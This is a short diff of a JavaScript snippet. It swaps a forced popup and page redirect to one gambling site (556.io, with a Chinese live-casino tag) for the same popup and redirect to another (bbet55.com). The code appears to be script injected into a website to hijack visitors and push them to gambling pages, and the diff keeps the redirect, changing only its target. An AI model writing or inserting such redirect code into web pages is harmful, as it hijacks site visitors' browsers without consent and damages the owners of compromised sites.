@@ -1,2 +1,3 @@
-window.open("http://556.io/#真人博彩进入8889.io"); 
-window.location.href="http://556.io/#真人博彩进入8889.io"; 
+window.open ("http://bbet55.com/"); 
+ 
+window.location.href="http://bbet55.com/"; 
